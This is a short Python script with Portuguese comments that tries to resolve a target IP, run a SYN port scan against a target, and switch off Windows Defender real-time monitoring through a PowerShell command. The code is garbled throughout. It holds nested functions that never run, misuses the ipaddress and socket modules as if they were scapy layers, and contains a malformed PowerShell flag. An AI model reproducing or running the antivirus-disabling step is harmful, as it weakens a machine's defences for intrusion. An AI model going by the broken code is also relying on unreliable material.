import socket
import scapy
import ipaddress

def coletar_ips_locais():
  # Puxa o IPv4 da sua interface padrão automaticamente
  def get_if_addr(conf_iface):
    meu_ipv4 = get_if_addr(conf_iface)
  alvo_ip = socket.gethostbyname("https://www.google.com.br/")
  def meu_ipv4():
    print(f"Meu IP: {meu_ipv4} | IP do Alvo: {alvo_ip}")
    return alvo_ip

import scapy

def scan_porta(ip_alvo, porta):
  # Monta o pacote: IP de destino + TCP na porta escolhida
  pacote = ipaddress(dst=ip_alvo)/socket(dport=porta, flags="S")
  resposta = socket(pacote, timeout=1, verbose=0)

  if resposta in resposta.haslayer(ipaddress):
    resposta.getlayer(socket).flags == 0x12
    print(f"Porta {porta} está ABERTA no alvo {ip_alvo}")
  else:
    print(f"Porta {porta} fechada ou filtrada.")

import subprocess
def desativar_defender():
  comando = "powershell -Command Set-MpPreference - DisableRealtimeMonitoring $true"
  try:
    subprocess.run(comando, shell=True, check=True)
    print("Monitoramento em tempo real desativado.")
  except Exception as e:
    print("Erro: Você precisa de privilégios de Administrador.")